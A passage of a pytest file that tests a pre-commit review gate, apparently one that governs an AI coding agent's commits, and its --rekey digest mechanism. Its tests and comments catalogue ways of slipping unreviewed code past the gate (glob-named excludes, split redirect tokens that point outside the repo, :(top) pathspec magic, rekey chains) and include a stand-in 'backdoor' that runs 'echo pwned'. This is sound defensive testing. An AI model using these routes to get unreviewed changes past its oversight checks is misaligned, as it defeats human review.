# entries per readable file (corrected fix-round-8, same-text pass: this
# comment previously said "2000-file limit") -- into a single
# "capped" marker with no content at all -- so two genuinely different byte
# sequences can produce the identical digest material. The actual safety
# boundary is the byte-identical SHA256 check PLUS the plain-regular-file
# mode check PLUS a LOSSLESS-MATERIAL check (`lossy_sink`,
# `rekey_digest_if_only_untracked_became_staged`) that refuses outright the
# moment any covered file's untracked-material formatting was lossy,
# regardless of whether the (necessarily incomplete) digest happens to match.
# ---------------------------------------------------------------------------


def test_rekey_reconstructs_for_files_under_a_directory_pathspec(sandbox, repo):
    """RED before the fix: reviewing while untracked under a DIRECTORY
    pathspec, then `git add`-ing those exact files, must reconstruct to the
    prior digest -- not refuse just because the pathspec names a directory
    rather than the individual files."""
    newdir = repo / "newdir"
    newdir.mkdir()
    (newdir / "a.py").write_text("a = 1\n")
    (newdir / "b.py").write_text("b = 1\n")
    root = _toplevel(repo)

    prior_key = prg.pending_key(root, str(repo), ["newdir"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "newdir/a.py", "newdir/b.py")
    # Staging alone moved the digest -- the documented AA-0064 problem,
    # now hit via a directory pathspec.
    current_key = prg.pending_key(root, str(repo), ["newdir"])
    assert current_key != prior_key

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["newdir"], prior_digest_hex
    )
    assert result == current_key


def test_rekey_via_directory_pathspec_still_refuses_a_real_content_change(sandbox, repo):
    """Negative twin: a changed byte after staging still refuses, even
    through a directory pathspec -- the byte-identical predicate is
    unweakened by widening membership to directory-relative names."""
    newdir = repo / "newdir"
    newdir.mkdir()
    (newdir / "a.py").write_text("a = 1\n")
    (newdir / "b.py").write_text("b = 1\n")
    root = _toplevel(repo)

    prior_key = prg.pending_key(root, str(repo), ["newdir"])
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "newdir/a.py", "newdir/b.py")
    (newdir / "a.py").write_text("a = 999\n")  # real change after staging

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["newdir"], prior_digest_hex
    )
    assert result is None


def test_rekey_cli_end_to_end_through_a_directory_pathspec(sandbox, repo):
    """Full round trip through record_review.py's --rekey CLI and the gate
    itself, driven by a directory pathspec -- the shape reported in #5886."""
    newdir = repo / "newdir"
    newdir.mkdir()
    (newdir / "a.py").write_text("a = 1\n")
    (newdir / "b.py").write_text("b = 1\n")
    root = _toplevel(repo)

    prior_key = prg.pending_key(root, str(repo), ["newdir"])
    _record(repo, "--clean", "--paths", "newdir")

    _git(repo, "add", "newdir/a.py", "newdir/b.py")
    # RED without the fix: staging alone re-fires the gate for the directory.
    assert prg.decide(root, str(repo), ["newdir"])[0] is True

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "newdir",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert prg.decide(root, str(repo), ["newdir"])[0] is False


def test_directory_membership_does_not_match_a_sibling_directory_with_a_shared_prefix(
    sandbox, repo
):
    """`newdir2` must not be swept into a `newdir` pathspec's reconstruction
    just because the string `newdir2` starts with `newdir`.

    HISTORY (GH #5886, updated for the round-2 final fix): an earlier
    version of this test pinned a Python helper's own bare-string-prefix
    behavior directly (`_entry_covers_name`'s `entry + os.sep` check). That
    helper is deleted -- membership for both halves of the reconstruction is
    now decided entirely by GIT ITSELF (`git ls-files --others -- newdir` /
    `git diff HEAD --name-status -- newdir`, both scoped to the literal
    `newdir` pathspec), never a Python string/prefix check at all. Git's own
    pathspec matching already treats `newdir` as denoting exactly that
    directory and everything under it, never a same-prefixed sibling
    directory -- this test now asserts that OUTCOME (a `newdir2` file is
    never present in the reconstruction) without asserting anything about
    HOW it's decided, since there is no longer any in-repo membership
    predicate to pin the internals of.
    """
    newdir = repo / "newdir"
    newdir.mkdir()
    (newdir / "a.py").write_text("a = 1\n")
    newdir2 = repo / "newdir2"
    newdir2.mkdir()
    (newdir2 / "c.py").write_text("c = 1\n")
    root = _toplevel(repo)

    reconstructed = prg.reconstruct_pending_diff_assuming_untracked(
        root, str(repo), ["newdir"], set()
    )
    assert reconstructed is not None
    assert "newdir2" not in reconstructed
    assert "newdir/a.py" in reconstructed or os.path.join("newdir", "a.py") in reconstructed


# ---------------------------------------------------------------------------
# GH #5886 fix-round-2 BLOCKER B1 (Opus round-1 review, live-reproduced): a
# bare `:(exclude)<path>` pathspec is a GLOB by default. When a force-
# untracked filename contains a git pathspec metacharacter (`*`, `?`, `[`),
# the bare exclude removes EVERY path the glob matches from the tracked-diff
# half -- including tracked, MODIFIED, glob-matched SIBLINGS that were never
# part of `force_untracked` -- and those siblings are not re-added by the
# untracked half, so an unreviewed edit to a tracked sibling silently
# vanishes from the reconstruction. Fixed via `:(exclude,literal)<path>`,
# which disables pathspec magic so the exclude matches only the exact string.
# ---------------------------------------------------------------------------


def test_rekey_refuses_when_force_untracked_glob_name_hides_unreviewed_sibling_edit(
    sandbox, repo
):
    """RED before the fix: a force-untracked path literally named with a git
    pathspec glob character (`*`) must never cause the bare `:(exclude)` to
    also exclude a DIFFERENT, modified, glob-matched tracked sibling from the
    reconstruction -- that would let an unreviewed edit to the sibling
    disappear from the digest and rekey would wrongly succeed."""
    (repo / "src").mkdir()
    (repo / "src" / "auth_helpers.py").write_text("def helper():\n    return 1\n")
    _git(repo, "add", "src/auth_helpers.py")
    _git(repo, "commit", "-q", "-m", "add helper", "--", "src/auth_helpers.py")

    # Untracked sibling whose literal name is a git pathspec glob.
    (repo / "src" / "auth*.py").write_text("def other():\n    return 2\n")
    root = _toplevel(repo)

    prior_key = prg.pending_key(root, str(repo), ["src/auth*.py"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "src/auth*.py")
    # Unreviewed edit to the TRACKED sibling the glob would also match.
    (repo / "src" / "auth_helpers.py").write_text(
        "def helper():\n    return 1\n\n"
        "def backdoor():\n    import os\n    os.system('echo pwned')\n"
    )
    _git(repo, "add", "src/auth_helpers.py")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["src/auth*.py"], prior_digest_hex
    )
    assert result is None

    # The refusal must be for the RIGHT reason: the tampered sibling's bytes
    # are present in the reconstruction (so the digest genuinely differs).
    # A git error would also make rekey return None; this pins that it did not.
    reconstructed = prg.reconstruct_pending_diff_assuming_untracked(
        root, str(repo), ["src/auth*.py"], {"src/auth*.py"}
    )
    assert reconstructed is not None
    assert "backdoor" in reconstructed


def test_symlinked_directory_pathspec_reconstructs_only_the_link_itself(sandbox, repo):
    """A SYMLINKED directory pathspec entry must reconstruct exactly what git
    itself reports for it -- the link path alone, never the files inside its
    TARGET directory (GH #5886 round 2: membership is decided entirely by
    git's own `diff --name-status` / `ls-files`, never a Python directory
    check that would follow the symlink via `os.path.isdir`). `realdir/a.py`
    must never appear in the reconstruction of a `linkdir` pathspec."""
    if not hasattr(os, "symlink"):
        pytest.skip("platform has no os.symlink support")
    real_dir = repo / "realdir"
    real_dir.mkdir()
    (real_dir / "a.py").write_text("a = 1\n")
    _git(repo, "add", "realdir/a.py")
    _git(repo, "commit", "-q", "-m", "realdir", "--", "realdir/a.py")
    link_path = repo / "linkdir"
    try:
        os.symlink("realdir", str(link_path), target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("platform/user cannot create symlinks")
    _git(repo, "add", "linkdir")
    root = _toplevel(repo)

    reconstructed = prg.reconstruct_pending_diff_assuming_untracked(
        root, str(repo), ["linkdir"], {"linkdir"}
    )
    assert reconstructed is not None
    assert "realdir/a.py" not in reconstructed
    assert "linkdir" in reconstructed


def test_rekey_succeeds_for_glob_named_file_when_no_sibling_edit_exists(sandbox, repo):
    """Positive twin: the identical glob-named-file setup, WITHOUT the
    unreviewed sibling edit, must still rekey successfully -- the literal
    exclude fix must not make the mechanism refuse legitimate cases."""
    (repo / "src").mkdir()
    (repo / "src" / "auth_helpers.py").write_text("def helper():\n    return 1\n")
    _git(repo, "add", "src/auth_helpers.py")
    _git(repo, "commit", "-q", "-m", "add helper", "--", "src/auth_helpers.py")

    (repo / "src" / "auth*.py").write_text("def other():\n    return 2\n")
    root = _toplevel(repo)

    prior_key = prg.pending_key(root, str(repo), ["src/auth*.py"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "src/auth*.py")
    # No edit to the sibling this time.
    current_key = prg.pending_key(root, str(repo), ["src/auth*.py"])

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["src/auth*.py"], prior_digest_hex
    )
    assert result == current_key


# --- record_review.py --rekey CLI (full round trip) ------------------------


def test_rekey_cli_accepts_when_only_untracked_became_staged(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    _record(repo, "--clean", "--paths", "new_module.py")

    _git(repo, "add", "new_module.py")
    # Gate re-fires purely from staging (RED without --rekey).
    assert prg.decide(root, str(repo), ["new_module.py"])[0] is True

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    # GREEN: the gate now allows the exact same content, unreviewed no more.
    assert prg.decide(root, str(repo), ["new_module.py"])[0] is False


def test_rekey_cli_refuses_when_content_actually_changed(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    _record(repo, "--clean", "--paths", "new_module.py")

    _git(repo, "add", "new_module.py")
    (repo / "new_module.py").write_text("def thing():\n    return 999\n")  # real change

    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0  # never a crash/nonzero; refusal is a printed message
    # Still blocked -- the real content change was never waved through.
    assert prg.decide(root, str(repo), ["new_module.py"])[0] is True


def test_rekey_cli_refuses_when_no_prior_review_recorded(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    _git(repo, "add", "new_module.py")
    bogus_key = "precommit:" + "a" * 16
    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", bogus_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert not sandbox.last_reviewed.exists()


def test_rekey_cli_refuses_when_prior_review_was_blockers_not_clean(sandbox, repo):
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["new_module.py"])
    _record(repo, "--blockers", "1", "--paths", "new_module.py")  # NOT clean

    _git(repo, "add", "new_module.py")
    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", prior_key, "--paths", "new_module.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    text = sandbox.last_reviewed.read_text()
    # The original blockers entry stands; nothing clean was carried forward.
    assert "blockers:1" in text
    assert " clean" not in text.replace("blockers:1", "")


# ---------------------------------------------------------------------------
# Finding 1, root-cause half (2026-09-01 fix round 3): --rekey citing an
# entry that is ITSELF a rekey entry resolves to and cites the chain's TRUE
# ROOT (one hop, never a transitive walk) -- turning chains into stars for
# audit_review_attribution.py's own star-shape exemption. The realistic git
# sequence that produces a genuine second --rekey call is awkward to
# construct purely through git mechanics (the byte-identity reconstruction
# is keyed to the CURRENT set of newly-added paths, which does not by
# itself distinguish "staged in an earlier stage-event" from "staged just
# now" across multiple separately-staged files) -- these tests instead
# place a well-formed 'B' entry (rekey=<A>) directly on the ledger, exactly
# the shape record_review.py's own writer produces for a real one-hop
# rekey, using the REAL untracked digest of the file under test so the
# byte-identity reconstruction genuinely matches it.
# ---------------------------------------------------------------------------


def test_rekey_root_resolution_follows_one_hop_and_cites_the_root(sandbox, repo):
    root_path = _toplevel(repo)
    (repo / "f.py").write_text("value = 1\n")
    b_key = prg.pending_key(root_path, str(repo), ["f.py"])  # the REAL untracked digest
    a_key = "precommit:" + "a" * 16  # a fabricated-but-well-formed placeholder root

    sandbox.last_reviewed.parent.mkdir(parents=True, exist_ok=True)
    sandbox.last_reviewed.write_text(
        f"{root_path} {a_key} clean ts=2026-08-30T20:00:00Z paths=f.py paths_n=1\n"
        f"{root_path} {b_key} clean ts=2026-08-30T21:00:00Z paths=f.py paths_n=1 rekey={a_key}\n"
    )

    _git(repo, "add", "f.py")  # digest moves off b_key
    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", b_key, "--paths", "f.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    text = sandbox.last_reviewed.read_text()
    new_line = text.strip().splitlines()[-1]
    assert f"rekey={a_key}" in new_line
    assert f"rekey={b_key}" not in new_line


def test_rekey_root_resolution_refuses_when_root_is_missing(sandbox, repo):
    root_path = _toplevel(repo)
    (repo / "f.py").write_text("value = 1\n")
    b_key = prg.pending_key(root_path, str(repo), ["f.py"])
    a_key = "precommit:" + "a" * 16  # never actually recorded

    sandbox.last_reviewed.parent.mkdir(parents=True, exist_ok=True)
    sandbox.last_reviewed.write_text(
        f"{root_path} {b_key} clean ts=2026-08-30T21:00:00Z paths=f.py paths_n=1 rekey={a_key}\n"
    )
    before_text = sandbox.last_reviewed.read_text()

    _git(repo, "add", "f.py")
    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", b_key, "--paths", "f.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert sandbox.last_reviewed.read_text() == before_text  # nothing written


def test_rekey_root_resolution_refuses_when_root_is_not_clean(sandbox, repo):
    root_path = _toplevel(repo)
    (repo / "f.py").write_text("value = 1\n")
    b_key = prg.pending_key(root_path, str(repo), ["f.py"])
    a_key = "precommit:" + "a" * 16

    sandbox.last_reviewed.parent.mkdir(parents=True, exist_ok=True)
    sandbox.last_reviewed.write_text(
        f"{root_path} {a_key} blockers:1 ts=2026-08-30T20:00:00Z paths=f.py paths_n=1\n"
        f"{root_path} {b_key} clean ts=2026-08-30T21:00:00Z paths=f.py paths_n=1 rekey={a_key}\n"
    )
    before_text = sandbox.last_reviewed.read_text()

    _git(repo, "add", "f.py")
    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", b_key, "--paths", "f.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert sandbox.last_reviewed.read_text() == before_text


def test_rekey_root_resolution_refuses_when_chain_is_deeper_than_one_hop(sandbox, repo):
    """A carries rekey= too (A is not itself a true root) -- only ONE hop
    is ever followed, never a transitive walk; refused rather than silently
    resolved further."""
    root_path = _toplevel(repo)
    (repo / "f.py").write_text("value = 1\n")
    b_key = prg.pending_key(root_path, str(repo), ["f.py"])
    a_key = "precommit:" + "a" * 16
    grandroot_key = "precommit:" + "9" * 16

    sandbox.last_reviewed.parent.mkdir(parents=True, exist_ok=True)
    sandbox.last_reviewed.write_text(
        f"{root_path} {grandroot_key} clean ts=2026-08-30T19:00:00Z paths=f.py paths_n=1\n"
        f"{root_path} {a_key} clean ts=2026-08-30T20:00:00Z paths=f.py paths_n=1 rekey={grandroot_key}\n"
        f"{root_path} {b_key} clean ts=2026-08-30T21:00:00Z paths=f.py paths_n=1 rekey={a_key}\n"
    )
    before_text = sandbox.last_reviewed.read_text()

    _git(repo, "add", "f.py")
    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", b_key, "--paths", "f.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert sandbox.last_reviewed.read_text() == before_text


def test_rekey_root_resolution_refuses_on_a_mutual_ab_cycle(sandbox, repo):
    """Nit 7 (2026-09-01 fix round 4): A.rekey=B and B.rekey=A -- a genuine
    cycle. Never producible by the real writer (BLOCKER 1 refuses any write
    onto an already-existing key, so neither entry could ever be modified
    after the fact to point back at the other), but pinned here as the
    root-resolution's sibling concern to the auditor's own mutual-A<->B
    pin (test_i_mutual_reference_both_flagged in
    test_audit_review_attribution.py): root resolution follows exactly one
    hop and refuses the moment THAT hop's own entry ALSO carries rekey=,
    regardless of what value it points to -- a cycle refuses identically to
    any other deeper-than-one-hop chain, already fail-closed by the SAME
    check the straight 2-hop test above exercises."""
    root_path = _toplevel(repo)
    (repo / "f.py").write_text("value = 1\n")
    b_key = prg.pending_key(root_path, str(repo), ["f.py"])
    a_key = "precommit:" + "c" * 16

    sandbox.last_reviewed.parent.mkdir(parents=True, exist_ok=True)
    sandbox.last_reviewed.write_text(
        f"{root_path} {a_key} clean ts=2026-08-30T20:00:00Z paths=f.py paths_n=1 rekey={b_key}\n"
        f"{root_path} {b_key} clean ts=2026-08-30T21:00:00Z paths=f.py paths_n=1 rekey={a_key}\n"
    )
    before_text = sandbox.last_reviewed.read_text()

    _git(repo, "add", "f.py")
    os.environ["CSA_ENFORCE"] = "1"
    try:
        rc = rr.main([
            str(rr.__file__), str(repo), "--rekey", b_key, "--paths", "f.py",
        ])
    finally:
        os.environ.pop("CSA_ENFORCE", None)
    assert rc == 0
    assert sandbox.last_reviewed.read_text() == before_text


# ---------------------------------------------------------------------------
# #4933: `tokens_outside_repo` + the decide() deny it feeds.
#
# The reviewer's OWN executed reproduction (2026-09-07 plan review) found
# the ONLY fail-open shape is a SPLIT redirect argument — `2> /tmp/e.log`,
# as its own separate pathspec token. The operator tokens themselves (`2>`,
# a FUSED `2>/tmp/x`, `2>&1`) are digest-inert and stay ALLOWED; that
# doctrine (CLAUDE.md's own "`2>&1` alone is digest-inert") is unchanged by
# this fix. Every case below was run against the real `decide()`/
# `tokens_outside_repo()` before being written here.
# ---------------------------------------------------------------------------


class TestTokensOutsideRepo4933:
    def test_bare_pathspec_allows(self, sandbox, repo):
        _record(repo, "--clean", "--paths", "a.py")
        block, _reason, _detail = prg.decide(_toplevel(repo), str(repo), ["a.py"])
        assert block is False

    def test_fd_operator_token_alone_allows_with_identical_digest(self, sandbox, repo):
        """`-- a.py 2>` (the bare operator token, no target at all) is
        digest-inert: same pending key as the bare pathspec."""
        key_bare = prg.pending_key(_toplevel(repo), str(repo), ["a.py"])
        key_with_op = prg.pending_key(_toplevel(repo), str(repo), ["a.py", "2>"])
        assert key_with_op == key_bare
        _record(repo, "--clean", "--paths", "a.py")
        assert prg.decide(_toplevel(repo), str(repo), ["a.py", "2>"])[0] is False

    def test_fused_redirect_token_allows_with_identical_digest(self, sandbox, repo):
        """`-- a.py 2>/tmp/e.log` (no space -- shlex fuses operator+target
        into ONE token) is likewise digest-inert."""
        key_bare = prg.pending_key(_toplevel(repo), str(repo), ["a.py"])
        key_fused = prg.pending_key(
            _toplevel(repo), str(repo), ["a.py", "2>/tmp/e.log"]
        )
        assert key_fused == key_bare
        _record(repo, "--clean", "--paths", "a.py")
        assert (
            prg.decide(_toplevel(repo), str(repo), ["a.py", "2>/tmp/e.log"])[0]
            is False
        )

    def test_plain_extra_filename_token_allows_with_identical_digest(self, sandbox, repo):
        """A second literal filename token (no redirect at all) is the same
        digest too -- 'out.txt' contributes nothing because it matches
        nothing tracked, exactly like the redirect-target tokens above."""
        key_bare = prg.pending_key(_toplevel(repo), str(repo), ["a.py"])
        key_extra = prg.pending_key(_toplevel(repo), str(repo), ["a.py", "out.txt"])
        assert key_extra == key_bare
        _record(repo, "--clean", "--paths", "a.py")
        assert prg.decide(_toplevel(repo), str(repo), ["a.py", "out.txt"])[0] is False

    def test_split_redirect_target_denies_pathspec_outside_repo(self, sandbox, repo):
        """THE #4933 hole: `-- a.py 2> /tmp/e.log` (SPACE-separated, so the
        operator and its absolute-path target are two separate pathspec
        tokens) used to make `pending_key` fail open via git's "outside
        repository" error. Now a confident, geometric deny."""
        block, reason, detail = prg.decide(
            _toplevel(repo), str(repo), ["a.py", "2>", "/tmp/e.log"]
        )
        assert block is True
        assert reason == prg.REASON_OUTSIDE_REPO
        assert any("tmp/e.log" in t for t in detail["outside"])

    def test_bare_absolute_path_outside_repo_denies(self, sandbox, repo):
        """Not just a redirect shape -- ANY pathspec token that resolves
        outside the repo root is caught, however it got there."""
        block, reason, detail = prg.decide(
            _toplevel(repo), str(repo), ["/abs/path/outside/repo"]
        )
        assert block is True
        assert reason == prg.REASON_OUTSIDE_REPO
        assert detail["outside"]

    def test_legit_relative_escape_looking_path_from_a_subdir_is_allowed(
        self, sandbox, repo
    ):
        """`../a.py` typed from a SUBDIRECTORY of the repo, naming a file at
        the repo root, is NOT an outside-repo escape -- it resolves to
        something genuinely inside the repo once normalized against cwd.
        Must reach the normal (allow-once-reviewed) flow, never the #4933
        deny."""
        sub = repo / "sub"
        sub.mkdir()
        escaped = prg.tokens_outside_repo(_toplevel(repo), str(sub), ["../a.py"])
        assert escaped == []
        _record(repo, "--clean", "--paths", "a.py")
        block, _reason, _detail = prg.decide(_toplevel(repo), str(sub), ["../a.py"])
        assert block is False

    def test_bare_pathspec_baseline_unreviewed_deny_unchanged(self, sandbox, repo):
        """A redirect-shaped token BEFORE the `--` marker (e.g. inside the
        commit message) tokenizes cleanly to the bare pathspec and is
        unaffected by this check entirely -- it never reaches
        tokens_outside_repo as a pathspec token at all."""
        block, reason, _detail = prg.decide(
            _toplevel(repo), str(repo), ["a.py"]
        )
        # Positive control: the bare pathspec alone still needs a review,
        # exactly as before -- nothing about this fix widens or narrows
        # that baseline behavior.
        assert block is True
        assert reason == prg.REASON_UNREVIEWED

    def test_tokens_outside_repo_is_error_safe_on_a_bogus_repo_root(self, sandbox):
        """A repo_root that cannot be resolved/realpath'd must never raise --
        the caller (decide()) treats an empty list as "nothing escaped" and
        falls through to its own existing fail-open handling."""
        assert (
            prg.tokens_outside_repo("/nonexistent/repo/root", "/nonexistent/repo/root", ["a.py"])
            == []
        )

    def test_message_for_outside_repo_names_the_reason_and_the_issue(self, sandbox, repo):
        _block, reason, detail = prg.decide(
            _toplevel(repo), str(repo), ["a.py", "2>", "/tmp/e.log"]
        )
        msg = prg.message_for(reason, detail, ["a.py", "2>", "/tmp/e.log"])
        assert "OUTSIDE the repository" in msg
        assert "4933" in msg
        assert "NEVER clear this reason" in msg

    def test_outside_repo_deny_fires_before_pending_key_is_ever_computed(
        self, sandbox, repo, monkeypatch
    ):
        """The #4933 deny must fire BEFORE pending_key() runs at all -- not
        merely produce the same verdict as if it had. Proven by making
        pending_key raise: if decide() still returns the OUTSIDE_REPO deny
        (rather than propagating/crashing), the deny path never reached it."""

        def boom(*_a, **_k):
            raise AssertionError("pending_key must not be called for an outside-repo pathspec")

        monkeypatch.setattr(prg, "pending_key", boom)
        block, reason, _detail = prg.decide(
            _toplevel(repo), str(repo), ["a.py", "2>", "/tmp/e.log"]
        )
        assert block is True
        assert reason == prg.REASON_OUTSIDE_REPO
        # The ledger itself must be untouched -- no digest was ever computed
        # or looked up for this pathspec.
        assert not sandbox.last_reviewed.exists()


# ---------------------------------------------------------------------------
# GH #5886 (second review round, 2026-09-23): membership for `--rekey`'s
# reconstruction was decided TWICE -- git's own pathspec matching removed a
# force-untracked file from the tracked-diff half via `:(exclude,literal)`,
# but the untracked-re-add half only re-added a name the Python helper
# `_entry_covers_name` judged "covered" (an exact string match, or a real
# on-disk directory prefix) -- which understands NOTHING about git pathspec
# syntax itself. A file matched only through a glob (`src/*.py`), git magic
# (`:(top)evil.py`), or the bare root pathspec (`.`) was excluded by git on
# one side and rejected by the Python helper on the other, vanishing from the
# reconstruction entirely -- reproduced end to end through the real CLI and
# through record_review.py's own printed --rekey hint. Fixed by letting git
# decide BOTH halves: `_entry_covers_name`/`_names_covered_by_entries` are
# deleted; `reconstruct_pending_diff_assuming_untracked`'s untracked set is
# now `real_untracked | force_untracked` with no further Python filtering,
# because `force_untracked` is itself always derived from git's own
# `diff --name-status` added-paths list under the SAME pathspec.
# ---------------------------------------------------------------------------


def test_glob_pathspec_with_new_unreviewed_file_after_review_refuses(sandbox, repo):
    """`src/*.py` reviewed while covering only an untracked glob-matched file;
    a SECOND, different unreviewed file also matching the glob is created and
    staged afterward -- rekey must REFUSE (the second file's content was
    never reviewed).

    GH #5886 M2 (fix-round-3, cold review): the OLD, buggy membership helper
    (`_entry_covers_name`, matching only an exact-string entry or a real
    on-disk directory prefix) made this test pass VACUOUSLY -- a literal
    glob string like "src/*.py" never equals a file name and is never a
    directory, so `_names_covered_by_entries` filtered the WHOLE candidate
    set out, `reconstruct_pending_diff_assuming_untracked` returned "", and
    `rekey_digest_if_only_untracked_became_staged` refused because the
    reconstruction was EMPTY -- not because it saw the evil file's content.
    Proven by this same setup's positive twin
    (`test_glob_pathspec_positive_twin_only_reviewed_file_staged`), which
    failed against the same buggy helper (expected a real key, got None):
    the "refuses" test was reporting the identical never-succeeds behavior
    as a false "correctly caught the evil file." The two assertions below
    close that gap: the raw reconstruction (with only the ORIGINALLY-reviewed
    file force-untracked, mirroring what the real evil-file-present
    reconstruction computes for its shared half) is proven non-empty and
    the evil file's content is proven genuinely PRESENT within it, so a
    membership fix that made the whole thing empty again cannot pass this
    test even if `rekey_digest_if_only_untracked_became_staged` still
    happens to return None for it.
    """
    root = _toplevel(repo)
    (repo / "src").mkdir()
    (repo / "src" / "auth_helpers.py").write_text("def helper():\n    return 1\n")
    _git(repo, "add", "src/auth_helpers.py")
    _git(repo, "commit", "-q", "-m", "helper", "--", "src/auth_helpers.py")

    (repo / "src" / "auth_other.py").write_text("def other():\n    return 2\n")
    prior_key = prg.pending_key(root, str(repo), ["src/*.py"])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "src/auth_other.py")
    # A brand-new, never-reviewed glob-matched file appears and gets staged too.
    (repo / "src" / "auth_evil.py").write_text("def evil():\n    return 666\n")
    _git(repo, "add", "src/auth_evil.py")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["src/*.py"], prior_digest_hex
    )
    assert result is None

    # Pin the REASON: the reconstruction must be non-empty and must actually
    # contain the evil file's content -- a vacuously-empty reconstruction
    # (the old bug's actual failure mode) must never satisfy this test.
    reconstructed = prg.reconstruct_pending_diff_assuming_untracked(
        root, str(repo), ["src/*.py"], {"src/auth_other.py", "src/auth_evil.py"}
    )
    assert reconstructed is not None
    assert reconstructed.strip(), "reconstruction must not be empty"
    assert "auth_evil.py" in reconstructed
    assert "evil" in reconstructed


def test_glob_pathspec_positive_twin_only_reviewed_file_staged(sandbox, repo):
    """Twin: only the file that WAS reviewed while untracked gets staged --
    must accept."""
    root = _toplevel(repo)
    (repo / "src").mkdir()
    (repo / "src" / "auth_helpers.py").write_text("def helper():\n    return 1\n")
    _git(repo, "add", "src/auth_helpers.py")
    _git(repo, "commit", "-q", "-m", "helper", "--", "src/auth_helpers.py")

    (repo / "src" / "auth_other.py").write_text("def other():\n    return 2\n")
    prior_key = prg.pending_key(root, str(repo), ["src/*.py"])
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "src/auth_other.py")
    current_key = prg.pending_key(root, str(repo), ["src/*.py"])

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["src/*.py"], prior_digest_hex
    )
    assert result == current_key


# ---------------------------------------------------------------------------
# (2) root pathspec `.`
# ---------------------------------------------------------------------------


def test_root_dot_pathspec_with_new_unreviewed_file_after_review_refuses(sandbox, repo):
    root = _toplevel(repo)
    prior_key = prg.pending_key(root, str(repo), ["."])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    (repo / "evil.py").write_text("evil = 1\n")
    _git(repo, "add", "a.py", "evil.py")

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["."], prior_digest_hex
    )
    assert result is None


def test_root_dot_pathspec_positive_twin(sandbox, repo):
    """The reviewed content includes a genuinely UNTRACKED file (so there is
    something for `_added_paths` to find once staged) plus the pre-existing
    tracked modification -- staging only that untracked file must accept."""
    root = _toplevel(repo)
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    prior_key = prg.pending_key(root, str(repo), ["."])
    assert prior_key and prior_key != prg.UNRESOLVABLE
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]

    _git(repo, "add", "new_module.py")
    current_key = prg.pending_key(root, str(repo), ["."])
    assert current_key != prior_key  # staging alone moved the digest

    result = prg.rekey_digest_if_only_untracked_became_staged(
        root, str(repo), ["."], prior_digest_hex
    )
    assert result == current_key


# ---------------------------------------------------------------------------
# (3) `a.py :(top)evil.py`
# ---------------------------------------------------------------------------


def test_top_magic_pathspec_with_new_unreviewed_file_after_review_refuses(sandbox, repo):
    """The ORIGINAL review used a plain pathspec (`a.py`) -- the `:(top)`
    magic token is introduced only on the CURRENT (post-review) pathspec, the
    realistic shape of this bypass: nobody reviews with pathspec magic in the
    command, an attacker's later commit widens the pathspec with it to sweep
    in unreviewed content."""
